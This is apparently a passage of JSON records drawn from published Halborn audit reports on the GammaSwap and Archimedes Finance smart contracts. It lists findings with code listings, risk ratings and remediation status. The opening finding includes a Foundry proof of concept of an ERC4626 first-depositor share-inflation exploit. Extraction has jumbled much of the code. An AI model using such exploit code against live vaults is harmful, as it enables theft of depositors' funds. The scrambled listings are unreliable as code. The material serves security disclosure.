cfmm_usdt_weth . transfer ( address ( univ2_usdt_weth_pool ) , Proof of Concept: Listing 4: PoC Code - ERC4626 Vulnerability vm . startPrank ( deployer ); weth . transfer ( user1 , 10 e18 ); usdt . transfer ( user1 , 10 e6 ); vm . stopPrank () ; 1 function test_erc4626vulnerability () public { 2 3  address ( weth ) , 20 * 1e6 , 20 * 1 e18 ); 4 5 6 7 8 9 10  weth ) , 10 * 1e6 , 10 * 1 e18 ); 11 12 13 14 15  balance / 2) ; 16 17 18 19 20 21  balance ); 22 23 24 25 26 27 28 29 30 31 32 33 34 vm . roll (16392000 + 2) ; vm . prank ( user1 ); vm . stopPrank () ; } univ2_usdt_weth_pool . deposit (1 , user1 ); vm . startPrank ( deployer ); cfmm_usdt_weth . approve ( address ( univ2_usdt_weth_pool ) , univ2_usdt_weth_pool . deposit ( balance , deployer ); vm . stopPrank () ; univ2_usdt_weth_pool . redeem (1 , user1 , user1 ); uint256 balance_final = cfmm_usdt_weth . balanceOf ( user1 ); console . log ( \" Initial balance : \" , balance ); console . log ( \" Final balance : \" , balance_final ); console . log ( \" Profit : \" , balance_final - balance ); 23 Screenshot: Code Location: Listing 5: GammaPoolERC4626.sol (Line 43) uint256 supply = totalSupply () ; uint256 _totalAssets = totalAssets () ; 39 function convertToShares ( uint256 assets ) public view virtual  returns ( uint256 ) { 40 41 42 43  supply ) / _totalAssets ; 44 } return supply == 0 || _totalAssets == 0 ? assets : ( assets * Risk Level: Likelihood - 3 Impact - 5 Recommendation: The contract should do INITIAL DEPOSIT to any address to prevent this attack to occur. For example, some amounts should be deposited for zero address for the initial deposit. 24 Remediation Plan: SOLVED: The GammaSwap team fixed the vulnerability by making the first Furthermore, there is a minimum amount deposit to the zero address. requirement to prevent rounding issues to occur. Commit IDs:  v1-strategies::5744f386f49d20fabb8760d16088a6f66631e335  v1-core::59dab5059a8214aec4f92fac9feeb11d8eaf9f4f 25 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: High"]}, {"title": "INCORRECT INVARIANT FACTOR CALCULATION MAY LEAD TO A LOSS OF ACCRUED FUNDS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The invariant factor formula makes use of the number of decimals of the first token in token pair. The result of this calculation is further used in multiple places across the contracts. For example, when you borrow liquidity from a GammaSwap pool, the protocol calculates that factor to update some storage variables such as lastFeeIndex and BORROWED_INVARIANT . Instead of focusing on s.decimal[0] only, both decimals should be considered. As a result, calculating this variable based on a wrong number of deci- mals affects borrowed/repaid liquidity and many storage variables in the protocol. Proof of Concept: Listing 6: Invariant Factor PoC vm . startPrank ( deployer ); vm . roll (16392000 + 1200) ; _addLiquidityWithUniRouter ( deployer , address ( usdt ) , address ( 1 // replace the s. decimals [0] variable in the getInvariantFactor ()  with 1 e18 and 1 e6 to see difference . 2 function test_BorrowAndRepayLifeCycleTask01 () public { 3 4  weth ) , 10 * 1e6 , 5 * 1 e18 ); 5 6 7 8 9 10 11 12 13 14 usdt . transfer ( user2 , 6 * 1 e6 ); weth . transfer ( user2 , 10 * 1 e18 ); usdt . transfer ( user1 , 5 * 1 e6 ); weth . transfer ( user1 , 2 * 1 e18 ); 26 }) ; vm . stopPrank () ; positionManager . depositNoPull ( depositData ); cfmm_usdt_weth . approve ( address ( positionManager ) , positionManager . transferFrom ( deployer , user1 , loanId ); uint256 loanId = positionManager . createLoan (1 , address ( uint256 loanId2 = positionManager . createLoan (1 , address ( IPositionManager . DepositWithdrawParams memory depositData = protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , lpTokens : cfmm_usdt_weth . balanceOf ( deployer ) , deadline : 99999 15  cfmm_usdt_weth ) , deployer , type ( uint ). max ); 16  cfmm_usdt_weth ) , user2 , type ( uint ). max ); 17 18 19  IPositionManager . DepositWithdrawParams ({ 20 21 22 23 24 25 26 27  cfmm_usdt_weth . balanceOf ( deployer )) ; 28 29 30 31 32 33  , 1 e6 , 1 e18 ); 34 35 36 37 38 39 40 41  increaseCollData = IPositionManager . AddRemoveCollateralParams ({ 42 43 44 45 46 47 48 49 50 51 52 protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , deadline : 99999 , amounts : amountsDesired uint256 [] memory amountsDesired = new uint256 [](2) ; amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; usdt . approve ( address ( positionManager ) , amountsDesired [1]) ; weth . approve ( address ( positionManager ) , amountsDesired [0]) ; IPositionManager . AddRemoveCollateralParams memory vm . startPrank ( user1 ); }) ; _addLiquidityWithUniRouter ( user1 , address ( usdt ) , address ( weth ) 27 usdt . approve ( address ( positionManager ) , amountsDesired [1]) ; weth . approve ( address ( positionManager ) , amountsDesired [0]) ; vm . roll (16392000 + 1304) ; positionManager . increaseCollateral ( increaseCollData ); vm . roll (16392000 + 1252) ; positionManager . increaseCollateral ( increaseCollData ); increaseCollData . amounts = amountsDesired ; vm . stopPrank () ; vm . stopPrank () ; vm . startPrank ( user2 ); amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; increaseCollData . tokenId = loanId2 ; increaseCollData . to = user2 ; 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  IPositionManager . BorrowLiquidityParams ({ 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , lpTokens : uint256 (1 e12 ) * 800 / 1000 , deadline : 99999 , minBorrowed : new uint256 [](2) amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; vm . roll (16392000 + 1340) ; vm . startPrank ( user1 ); }) ; increaseCollData . amounts = amountsDesired ; positionManager . borrowLiquidity ( borrowLqtyData ); IPositionManager . BorrowLiquidityParams memory borrowLqtyData = 28 96 97 98 99 100 101 102 vm . stopPrank () ; vm . prank ( user2 ); positionManager . decreaseCollateral ( increaseCollData ); IPositionManager . RepayLiquidityParams memory repayData =  IPositionManager . RepayLiquidityParams ({ 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 } protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , liquidity : 1000000 / 2, deadline : 99999 , minRepaid : new uint256 [](2) }) ; vm . stopPrank () ; vm . startPrank ( deployer ); usdt . transfer ( address ( cfmm_usdt_weth ) , 10 * 1 e6 ); weth . transfer ( address ( cfmm_usdt_weth ) , 5 * 1 e18 ); vm . stopPrank () ; Screenshot: 29 Code Location: BaseStrategy Listing 7: BaseStrategy.sol (Line 33) 32 function getInvariantFactor () internal virtual override view  returns ( uint256 ) { 33 34 } return 10 ** s . decimals [0]; AbstractRateModel Listing 8: AbstractRateModel.sol (Line 11) uint256 totalInvariant = lpInvariant + borrowedInvariant ; if ( totalInvariant == 0) 6 function calcUtilizationRate ( uint256 lpInvariant , uint256  borrowedInvariant ) internal virtual view returns ( uint256 ) { 7 8 9 10 11  totalInvariant ; 12 } return borrowedInvariant * getInvariantFactor () / return 0; Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider changing the invariant factor formula to include the number of decimals of both tokens in a pair. If the invariant factor is less than 1e18, loss of precision may occur. 30 Remediation Plan: SOLVED: This finding was identified in a code walkthrough jointly by the GammaSwap team and the Halborn team, and the existence of the finding was confirmed by the Halborn team. The invariant factor is now calculated as 10**18. Commit ID: v1-strategies::85864193924b7d1299dd99a27ded752c807ae2cb 31 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Medium"]}, {"title": "CALLING THE BATCHLIQUIDATIONS FUNCTION WITH TOKENID 0 ALWAYS REVERTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The _batchLiquidations function implemented in the LiquidationStrategy contract is designed to perform more than one liquidation in a go. The tokenId > 0 check on the payLoanAndRefundLiquidator function assures that users can use 0 as tokenId for batch liquidation operation. However, it is not possible to use 0 as tokenId in the _batchLiquidations function. The _batchLiquidations function makes an internal call to the sumLiquidity function. During the calculation of the liquidity variable, the execution is reverted with the Division or modulo by 0 error since the _loan. rateIndex is also zero for tokenId 0. Code Location: Listing 9: LiquidationStrategy.sol (Line 164) 156 function sumLiquidity ( uint256 [] calldata tokenIds ) internal  virtual returns ( uint256 liquidityTotal , uint256 collateralTotal ,  uint256 lpTokensPrincipalTotal , uint128 [] memory tokensHeldTotal )  { 157 158 159 160 161 162 163 164 address [] memory tokens = s . tokens ; uint128 [] memory tokensHeld ; address cfmm = s . cfmm ; tokensHeldTotal = new uint128 []( tokens . length ); ( uint256 accFeeIndex , ,) = updateIndex () ; for ( uint256 i = 0; i < tokenIds . length ; i ++) { LibStorage . Loan storage _loan = s. loans [ tokenIds [ i ]]; uint256 liquidity = uint128 (( _loan . liquidity * accFeeIndex  ) / _loan . rateIndex ); 165 166 tokensHeld = _loan . tokensHeld ; lpTokensPrincipalTotal = lpTokensPrincipalTotal + _loan .  lpTokens ; 167 _loan . liquidity = 0; 32 168 169 170 171 172 173 174 175 176 _loan . initLiquidity = 0; _loan . rateIndex = 0; _loan . lpTokens = 0; uint256 collateral = calcInvariant ( cfmm , tokensHeld ); canLiquidate ( collateral , liquidity , 950) ; collateralTotal = collateralTotal + collateral ; liquidityTotal = liquidityTotal + liquidity ; for ( uint256 j = 0; j < tokens . length ; j ++) { tokensHeldTotal [ j ] = tokensHeldTotal [ j] + tokensHeld [ j _loan . tokensHeld [ j] = 0;  ]; 177 178 179 180 } } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add a sanity check to prevent division by zero in the sumLiquidity function. The contract should not continue dividing if denominator of division operations are zero. Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed that throwing the Division or modulo by zero error is the intended behavior. 33 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Medium"]}, {"title": "INCOMPATIBILITY WITH FEE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When depositing reserves, it was identified that the preDepositToCFMM() function assumes that the deposited amount of tokens is the same as sent in the parameter plus the balance before the deposit. This could block any deposit if a deflationary token is used, as the calculated amount could be lower than the deposited amount. The comparison with the not equal (!=) sign does not work with any of Fee-On-Transfer tokens. Code Location: ShortStrategy Listing 10: ShortStrategy.sol (Line 61) balances [i ] = GammaSwapLibrary . balanceOf ( IERC20 ( tokens function preDepositToCFMM ( uint256 [] memory amounts , address to address [] storage tokens = s. tokens ; uint256 [] memory balances = new uint256 []( tokens . length ); for ( uint256 i = 0; i < tokens . length ; i ++) { 52  , bytes memory data ) internal virtual { 53 54 55 56  [ i ]) , to ); 57 58  amounts , to , data ); // TODO : Risky . Should set sender to PosMgr 59 for ( uint256 i = 0; i < tokens . length ; i ++) { 60 61  balanceOf ( IERC20 ( tokens [i ]) , to )) { 62 63 64 } ISendTokensCallback ( msg . sender ). sendTokensCallback ( tokens , if ( balances [ i ] + amounts [i ] != GammaSwapLibrary . revert WrongTokenBalance ( tokens [i ]) ; if ( amounts [ i] > 0) { } } 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: The last if statement of preDepositToCFMM() function should be replaced to include preBalance and postBalance variables and verification of the balance before/after the transfer. Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed this if block is added intentionally. The GammaSwap team added some features to contracts to prevent potential problems with fee-on-transfer tokens. Commit IDs:  v1-core::59dab5059a8214aec4f92fac9feeb11d8eaf9f4f  v1-periphery::43eab8008f052671b9f091b0834b7dcc0d15c9fc 35 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Medium"]}, {"title": "CENTRALIZATION RISK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The extra condition in the if statement described in the Code Location section poses a centralization risk. The isRestricted function is de- signed to check if a protocolId is restricted. However, the _owner of the contract is excluded from this control. This increases the centralization of the contract. Code Location: GammaPoolFactory Listing 11: GammaPoolFactory.sol (Line 26) if ( isProtocolRestricted [ protocolId ] == true && msg . sender != 25 function isRestricted ( uint16 protocolId , address _owner ) internal  virtual view { 26  _owner ) { 27 28 29 } revert ProtocolRestricted () ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider removing _owner != msg.sender control from the if block or de- centralizing protocol governance. 36 Remediation Plan: RISK ACCEPTED: The GammaSwap team accepted the risk, and they confirmed a multisig wallet will be the owner of the contract. 37 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Low"]}, {"title": "LOAN CALCULATION CAN BE MISLEADING FOR DIFFERENT CHAINS DUE TO HARDCODED VARIABLES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The calcFeeIndex function in the BaseStrategy contract uses one year as a constant, with its value equal to the number of blocks per year (2252571). This assumes a block is mined every 14 seconds on average. However, average block time may vary across EVM-compatible chains. In this case, the results can be misleading or inaccurate for those other chains. Code Location: BaseStrategy Listing 12: BaseStrategy.sol (Lines 47,49) uint256 blockDiff = block . number - lastBlockNum ; uint256 adjBorrowRate = ( blockDiff * borrowRate ) / 2252571; // 45 function calcFeeIndex ( uint256 lastCFMMFeeIndex , uint256 borrowRate  , uint256 lastBlockNum ) internal virtual view returns ( uint256 ) { 46 47  2252571 year block count 48 49 50 51 } uint256 ONE = 10**18; uint256 apy1k = ONE + ( blockDiff * 10 * ONE ) / 2252571; return Math . min ( apy1k , lastCFMMFeeIndex + adjBorrowRate ); Risk Level: Likelihood - 2 Impact - 3 38 Recommendation: Instead of hardcoding the number of blocks per year, consider adding a constructor argument to be able to deploy the protocol into other chains than Ethereum network. Remediation Plan: SOLVED: The GammaSwap team replaced the hardcoded variable with a con- structor parameter. With this update, it is possible to change the number of blocks per year. Commit ID: v1-strategies::1d2c35c5324209bb74133338bee991be4b4378b7 39 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Low"]}, {"title": "TOKEN SWAPPING CAN FAIL DUE TO DIVISION BY ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is an edge case scenario of token swapping operation which leads to the division by zero error. The beforeSwapTokens function in the CPMMBaseLongStrategy contract is a function which calculates the exact in and out amounts of the swap operation. If amountIn and reserveIn parameters of calcAmtOut() function are equal, then the denominator is equal to zero. As a result, the swapping operation fails in this case. Code Location: Listing 13: CPMMBaseLongStrategy.sol (Line 109) 105 function calcAmtOut ( uint256 amountIn , uint256 reserveOut , uint256  reserveIn ) internal view returns ( uint256 ) { if ( reserveOut == 0 || reserveIn == 0) { revert ZeroReserves () ; } uint256 denominator = ( reserveIn - amountIn ) * tradingFee1 ; return ( reserveOut * amountIn * tradingFee2 / denominator ) + 106 107 108 109 110  1; 111 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Consider implementing an additional condition to prevent the denominator from being equal to zero. 40 Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed the delta of reserveIn and amountIn will not be equal to 0 for Uniswap swaps. Therefore, reaching the Division by zero revert is impossible in this edge case. 41 ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Low"]}, {"title": "LACK OF ZERO AMOUNT CHECK MAY LEAD DIVISION BY ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In Solidity, transactions are reverted with the division by zero error message when a division by zero is attempted. In the BaseStrategy.sol contract, some possible divisions by 0 can be performed when calling calcCFMMFeeIndex() function. This division operation should be preceded by sanity checks to prevent dividing a number by zero. Code Location: Listing 14: BaseStrategy.sol (Line 39) uint256 prevInvariant = borrowedInvariant > if ( lastCFMMInvariant > 0 && lastCFMMTotalSupply > 0 && 36 function calcCFMMFeeIndex ( uint256 borrowedInvariant , uint256  lastCFMMInvariant , uint256 lastCFMMTotalSupply , uint256  prevCFMMInvariant , uint256 prevCFMMTotalSupply ) internal virtual  view returns ( uint256 ) { 37  prevCFMMInvariant > 0 && prevCFMMTotalSupply > 0) { 38  prevCFMMInvariant ? borrowedInvariant : prevCFMMInvariant ; //  deleverage CFMM Yield 39  lastCFMMTotalSupply ) / 10**18; 40  lastCFMMTotalSupply * ( prevInvariant - prevCFMMInvariant )) /  denominator ); 41 42 43 return (( lastCFMMInvariant * prevCFMMTotalSupply + uint256 denominator = ( prevInvariant * } return 10**18; } 42 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a sanity check to control whether the borrowed amount is zero or not. Remediation Plan: SOLVED: This finding was resolved by the GammaSwap team after changing the calculation to remove the possibility of dividing by 0. v1-strategies::d5f3cedf864d7def66ea9e2ea72273704d1e4992 43 3.10 (HAL-10) MISSING ZERO ADDRESS CHECKS - LOW ", "labels": ["Halborn", "GammaSwap_Labs_Core_Strategies_and_Periphery", "Severity: Informational"]}, {"title": "HAL01", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been observed that once a user tries to create any position, the Leverage Engine will try to transfer the OUSD principle to the Leverage Engine. However, due to OUSD behavior, trying to transfer more tokens than allowance will revert with an Underflow error message. Although in recent versions of solidity, this is no longer a critical issue as the value doesnt reset to the maximum value, it is still recommended to verify that the user has enough allowance before transferring the tokens, as the underflow error can be confusing to users. Code Location: Listing 1: contracts/LeverageEngine.sol (Line 99) 62 /* Non - privileged functions */ 63 64 // / @dev deposit OUSD under NFT ID 65 // / 66 // / User sends OUSD to the contract . 67 // / We mint NFT , assign to msg . sender and do the leverage cycles 68 // / 69 // / @param ousdPrinciple the amount of OUSD sent to Archimedes 70 // / @param cycles How many leverage cycles to do 71 // / @param maxArchAmount max amount of Arch tokens to burn for  position 72 function createLeveragedPosition ( uint256 ousdPrinciple , 73 uint256 cycles , 74 uint256 maxArchAmount 75 76 ) external nonReentrant whenNotPaused returns ( uint256 ) { 77  position 78  getMaxNumberOfCycles () ) { // add some minor buffer to the arch we will use for the if ( cycles == 0 || cycles > _parameterStore . 14 revert ( \" Invalid number of cycles \"); revert ( \" Collateral lower then min \" ); uint256 lvUSDAmountNeedForArguments = _parameterStore . // / check that user gave enough arch allowance for cycle - } // console . log (\" ousdPrinciple % s\", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . getMinPositionCollateral () } // console . log (\" maxArchAmountBufferedDown %s \", maxArchAmount ) ; uint256 maxArchAmountBufferedDown = maxArchAmount ; uint256 lvUSDAmount = _parameterStore . 79 80 81 82  ) { 83 84 85 86 87  getAllowedLeverageForPositionWithArch ( ousdPrinciple , cycles ,  maxArchAmountBufferedDown ); 88  getAllowedLeverageForPosition ( ousdPrinciple , cycles ); 89  principle combo 90  get enough lvUSD \" ); 91  calculateArchNeededForLeverage ( lvUSDAmount ) / 10000) * 10000; //  minus 1000 wei 92 93 94  enough Arch given for Pos \" ); 95 96  lvUSD \" ); 97 98 99  ousdPrinciple ); _burnArchTokenForPosition ( msg . sender , archNeededToBurn ); uint256 positionTokenId = _positionToken . safeMint ( msg . sender ); _ousd . safeTransferFrom ( msg . sender , _addressCoordinator , uint256 availableLev = _coordinator . getAvailableLeverage () ; require ( availableLev >= lvUSDAmount , \" Not enough available require ( lvUSDAmountNeedForArguments - 1 <= lvUSDAmount , \" cant require ( archNeededToBurn <= maxArchAmountBufferedDown , \" Not // console . log (\" archNeededToBurn %s \", maxArchAmount ) ; uint256 archNeededToBurn = ( _parameterStore . 100 _coordinator . depositCollateralUnderNFT ( positionTokenId ,  ousdPrinciple ); 101 102 _coordinator . getLeveragedOUSD ( positionTokenId , lvUSDAmount ); uint256 psoitionExpireTime = _coordinator .  getPositionExpireTime ( positionTokenId ); 103 104 emit PositionCreated ( msg . sender , positionTokenId ,  ousdPrinciple , lvUSDAmount , archNeededToBurn , psoitionExpireTime ); 105 106 107 } return positionTokenId ; 15 Proof Of Concept:  The user calls the createLeveragedPosition() in the LeverageEngine contract having enough OUSD balance but not enough allowance.  Transaction revert due to integer underflow. Risk Level: Likelihood - 4 Impact - 2 Recommendation: Implementing a require statement validating that the users allowance for the Leverage Engine is equal to or greater than the OUSD principle is recommended. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by checking that the OUSD allowance is equal to or greater than the OUSD principle provided in the arguments. 16 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Medium"]}, {"title": "LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple contracts are using the Initializable module from OpenZeppelin. To prevent leaving an implementation contract uninitialized OpenZep- pelins documentation recommends adding the _disableInitializers func- tion in the constructor to lock the contracts automatically when they are deployed: Code Location: Listing 2 * @dev Locks the contract , preventing any future reinitialization * Calling this in the constructor of a contract will prevent that * to any version . It is recommended to use this to lock * through proxies . */ 1 /* * 2  . This cannot be part of an initializer call . 3  contract from being initialized or reinitialized 4  implementation contracts that are designed to be called 5 6 7 function _disableInitializers () internal virtual { 8  initializing \"); 9 10 11 12 13 } _initialized = type ( uint8 ). max ; emit Initialized ( type ( uint8 ). max ); require (! _initializing , \" Initializable : contract is if ( _initialized < type ( uint8 ). max ) { } 17 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider function TimeLockControllerUpgradeable contract constructor as well: _disableInitializers calling the in the Listing 3 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by calling the _disableInitializers function in the contract constructor. 18 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Low"]}, {"title": "LACK OF PARAMETER PRECISION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been detected that some parameters used in the different contracts are set and used in a way that lets the minimum settable value at 1%. Code Location: Listing 4: ParameterStore.sol (Line 40) _maxNumberOfCycles = 10; _originationFeeRate = 5 ether / 100; _globalCollateralRate = 90; _rebaseFeeRate = 10 ether / 100; // meaning 10% _treasuryAddress ; _curveGuardPercentage = 90; _slippage = 2; // 2%; _archToLevRatio = 1 ether ; // meaning 1 arch is equal 1 34 35 36 37 38 39 40 41  lvUSD 42  with get 50% more then we expected 43 _treasuryAddress = address (0) ; _curveMaxExchangeGuard = 50; // meaning we allow exchange For example, _slippage is set to 2, implying that a maximum slippage of 2% is allowed. However, if this value needs to be modified in the future or if user-controlled slippage is implemented, it would only accept integer values, such as 0%, 1%, 2%, etc. Risk Level: Likelihood - 1 Impact - 3 19 Recommendation: Consider increasing the digits in the % calculations to allow more flex- ibility when using these parameters. Remediation Plan: NOT SOLVED: The Archimedes Finance team did not solve the issue. 20 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Low"]}, {"title": "INCONSISTENT PARAMETER FORMATTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "ParameterStore.sol contract stores global parameters used when managing positions, such as _maxNumberOfCycles, _originationFeeRate, etc. However, it has been detected that parameters with a similar format or that are used in similar ways (like percentages, for example) are defined and used differently, which could cause unexpected contract behavior (or even worse situations such as fund loss) if they are mistakenly modified. Code Location: Listing 5: ParameterStore.sol (Lines 36,37) _maxNumberOfCycles = 10; _originationFeeRate = 5 ether / 100; _globalCollateralRate = 90; _rebaseFeeRate = 10 ether / 100; // meaning 10% _treasuryAddress ; _curveGuardPercentage = 90; _slippage = 2; // 2%; _archToLevRatio = 1 ether ; // meaning 1 arch is equal 1 34 35 36 37 38 39 40 41  lvUSD 42  with get 50% more then we expected 43 _treasuryAddress = address (0) ; _curveMaxExchangeGuard = 50; // meaning we allow exchange In this example can be seen how two different rates (with 90% and 10% values, respectively) are calculated differently. Risk Level: Likelihood - 1 Impact - 3 21 Recommendation: It is strongly recommended to unify the parameter criteria in a way that allows contract administrators to set parameters of the same nature in the same way. Remediation Plan: RISK ACCEPTED: The Archimedes Finance team accepted the risk of this finding. 22 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Low"]}, {"title": "LACK OF 0 ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When setting the dependencies for the contract through the setDependencies () functions, the 0 address is not being checked in any of the contracts. Code Location: Listing 6: contracts/LeverageEngine.sol address addressCoordinator , address addressPositionToken , address addressParameterStore , address addressArchToken , address addressOUSD 43 function setDependencies ( 44 45 46 47 48 49 ) external nonReentrant onlyAdmin { 50 51 52 53 54 55 56 57 58 59 60 } 61 _addressCoordinator = addressCoordinator ; _coordinator = ICoordinator ( addressCoordinator ); _addressPositionToken = addressPositionToken ; _positionToken = PositionToken ( addressPositionToken ); _addressParameterStore = addressParameterStore ; _parameterStore = ParameterStore ( addressParameterStore ); _addressArchToken = addressArchToken ; _archToken = ArchToken ( addressArchToken ); _addressOUSD = addressOUSD ; _ousd = IERC20Upgradeable ( _addressOUSD ); Risk Level: Likelihood - 2 Impact - 1 23 Recommendation: When setting an address variable, always make sure the value is not zero. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by adding a zero address check in the setDependencies() functions. 24 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Informational"]}, {"title": "> 0 IS LESS EFFICIENT THAN != 0 FOR UINTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of > consumes more gas than !=. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cant be negative, and as such, there is only a need to check that a number is not 0. Code Location: CDPosition.sol - Line 40: require(_nftCDP[nftID].oUSDPrinciple > 0, \"NFT ID must exist \"); Coordinator.sol Line - shares\"); 143: require(numberOfSharesInPosition > 0, \"Position has no ParameterStore.sol - Line 63: require(newMaxNumberOfCycles < 20 && newMaxNumberOfCycles > 0, \"New max n of cycles out of range\"); - Line 81: require(newGlobalCollateralRate <= 100 && newGlobalCollateralRate > 0, \"New collateral rate out of range\"); - Line 87: require(newMaxNumberOfCycles < 20 && newMaxNumberOfCycles > 0, \"New max n of cycles out of range\"); Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Use != instead of > in cases where both can be used. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by replacing > with !=. 26 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Informational"]}, {"title": "REDUNDANT VARIABLE USAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Redundant variable assignments have been found through the code. These statements increase gas costs for contract deploying and interactions, and impact code readability. Code Location: In this example, maxArchAmountBufferedDown is assigned with the value from the maxArchAmount parameter instead of using the parameter variable directly. Listing 7: contracts/LeverageEngine.sol (Line 72) // add some minor buffer to the arch we will use for the if ( cycles == 0 || cycles > _parameterStore . 72 function createLeveragedPosition ( uint256 ousdPrinciple , 73 uint256 cycles , 74 uint256 maxArchAmount 75 76 ) external nonReentrant whenNotPaused returns ( uint256 ) { 77  position 78  getMaxNumberOfCycles () ) { 79 80 81 82  ) { 83 84 85 86 revert ( \" Collateral lower then min \" ); revert ( \" Invalid number of cycles \"); } // console . log (\" ousdPrinciple % s\", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . getMinPositionCollateral () } // console . log (\" maxArchAmountBufferedDown %s \", maxArchAmount ) ; uint256 maxArchAmountBufferedDown = maxArchAmount ; Moreover, in this other example cyclePrinciple is assigned with the value from the principle parameter. 27 Listing 8: contracts/ParameterStore.sol (Line 171) 171 function getAllowedLeverageForPosition ( uint256 principle , uint256  numberOfCycles ) public view returns ( uint256 ) { 172 require ( numberOfCycles <= _maxNumberOfCycles , \" Cycles greater  than max allowed \" ); 173 174 uint256 leverageAmount = 0; uint256 cyclePrinciple = principle ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Redundant variable assignments should be deleted to improve code read- ability and usability and reduce gas costs when deploying or interacting with the contract. Remediation Plan: PARTIALLY SOLVED: The Archimedes Finance team fixed the issue in some instances, but it has been partially solved. 28 ", "labels": ["Halborn", "Archimedes_Finance", "Severity: Informational"]}, {"title": "REDUNDANT FUNCTIONS CALLS AND CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract 